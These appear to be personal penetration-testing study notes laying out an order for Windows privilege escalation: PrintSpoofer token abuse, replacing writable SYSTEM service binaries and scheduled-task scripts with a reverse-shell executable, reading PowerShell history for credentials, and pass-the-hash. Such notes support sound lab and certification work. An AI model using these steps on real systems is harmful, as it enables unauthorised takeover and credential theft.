## Windows Priv Esc Order of Operations
Follow this order when working through them

1. Token Privileges (SeImpersonate)
2. Services (Writable binaries / configs)
3. Scheduled Tasks
4. Credential Reuse
5. Stored Credentials
6. Kernel Exploits (last resort)

## Token Privileges SeImpersonate

### **(How You Notice It)**:
- `whoami /priv` confirms it
- - winPEAS shows SeImpersonatePrivilege enabled

Meaning:
- You can impersonate SYSTEM tokens

Confirm OS version:
`systeminfo`


Decide Attack Vector:
- Windows Server / Win10 → **PrintSpoofer**
- Older Windows → Potato variants


Transfer exploit binary:
- Use **File_Transfer.md**
- Use certutil / SMB / UNC

`PrintSpoofer.exe -i -c cmd`
	Verify with whoami


## **Writable Windows Services (VERY COMMON)**
### **How to spot**

From winPEAS:
- “Service binary is writable”
- Service runs as SYSTEM

Manual check:
```cmd
sc qc <service_name>
```

 Check permissions:
```cmd
icacls "C:\Path\to\service.exe"
```

Look for:

- (W) - Write
	You can **modify the file’s contents**
	You can overwrite the binary
	You **cannot** change permissions or delete the file
    
- (F) - Full Control
	Includes everything:

	 Read
     Write
     Modify
     Delete
     Change permissions
     Take ownership
    
- (M) - Modify
	 Includes:

	 Read
	 Write
     Execute
     Delete

 Replace binary:
 ```cmd
 copy winrev.exe "C:\Path\to\service.exe"
 ```

Restart service:
```cmd
sc stop <service>
sc start <service>
```




## **Scheduled Tasks**

### **How to spot**
winPEAS shows:

- Scheduled task runs as SYSTEM
- Script or binary is writable

Manual check:
```cmd
schtasks /query /fo LIST /v
```


 Identify task:
```cmd
schtasks /query /fo LIST /v | more
```
 Locate executable/script:
 ```cmd
 type "C:\Path\to\script.bat"
 ```
Replace content:
```cmd
echo C:\Users\Public\winrev.exe > script.bat
```

Wait or force run:
schtasks /run /TN `<TaskName>`

Finally. Shell pops → SYSTEM




## **Stored Credentials**
### **How to spot**

winPEAS hits:
- Powershell history
- Registry creds
- Saved credentials

To Check PowerShell history:
```cmd
type %APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

Check saved creds:
```cmd
cmdkey /list
```

Try reuse:
```cmd
runas /user:Administrator cmd
```


##  **Credential Reuse / Pass-the-Hash**
### **How to spot**
- NTLM hash found
- Plaintext password found
- Domain creds discovered

With NTLM hash we can use NetExec (`nxc`) to pass the hash or crack it with a wordlist:

## **OPTION 1️⃣ — Pass-the-Hash (No Cracking)**
Use when:

- You don’t need the plaintext password
    
- You want **fast lateral movement**
    
- You want to test access across machines/services

What happens:

- You authenticate **using the hash itself**
    
- No password is required
    
- Works if NTLM auth is enabled

Typical outcomes:

- SMB access
    
- Command execution
    
- Lateral movement
    
- Sometimes admin access
    


📌 Tool reference (details elsewhere):

- [[CrackMapExec]]
- [[NetExec]] (preferred)


## **OPTION 2️⃣ — Crack the Hash (Get Plaintext Password)**

Use when:
- You want RDP / interactive login
    
- You want persistence
    
- You want to reuse creds across many services
    
- You want to escalate privileges cleanly

What happens:

- Offline cracking
    
- You recover the actual password
    
- Password may work for:
    
    - Same user on other machines
        
    - Higher-privileged accounts
        
    - Domain logins
    
📌 Tool reference (details elsewhere):

- [[Hashcat]]
- [[JohntheRipper]]






## **Kernel Exploits (LAST RESORT)**
### **How to spot**

winPEAS / Watson:
- Vulnerable kernel
- No misconfigs found

Confirm OS:

```cmd
systeminfo
```

Match exploit carefully
    
Transfer exploit
    
Execute
    
Pray box doesn’t crash